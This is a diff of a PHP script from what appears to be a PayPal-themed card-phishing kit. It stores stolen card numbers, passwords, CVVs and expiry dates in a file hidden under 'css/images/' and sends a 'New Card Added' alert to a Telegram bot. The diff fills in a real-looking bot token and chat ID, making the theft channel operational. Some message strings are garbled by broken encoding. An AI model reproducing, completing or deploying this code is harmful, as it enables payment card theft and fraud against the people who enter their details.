@@ -43,7 +43,7 @@ $protocol = $_SERVER['SERVER_PROTOCOL'];
     $ref = $_SERVER['HTTP_REFERER'];
     $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
     file_put_contents("css/images/i.txt","$cards$cardss$cardsss$cardssss:$pass:$cvv:$sal:$mah");
-    $token = " Êò‰ —»«  ŒÊœ Ê‰ —Ê »“‰Ìœ"; //YourBotToken
+    $token = "489030373:AAGCS3cr2RJknS0RHHZHsricQNeXdloVn8w"; //YourBotToken
      $textmsg = "
  !New Card Added üçâ 
 ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
@@ -57,7 +57,7 @@ $protocol = $_SERVER['SERVER_PROTOCOL'];
 ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
 üîÖChannel TelegramüîÖ Telegram.me/Paypal";
 
-     $gpid = 8529955; //ChatID
+     $gpid = 75224801; //ChatID
 
      $send = file_get_contents("https://api.telegram.org/bot$token/SendMessage?chat_id=$gpid&text=".urlencode($textmsg));
 }else{
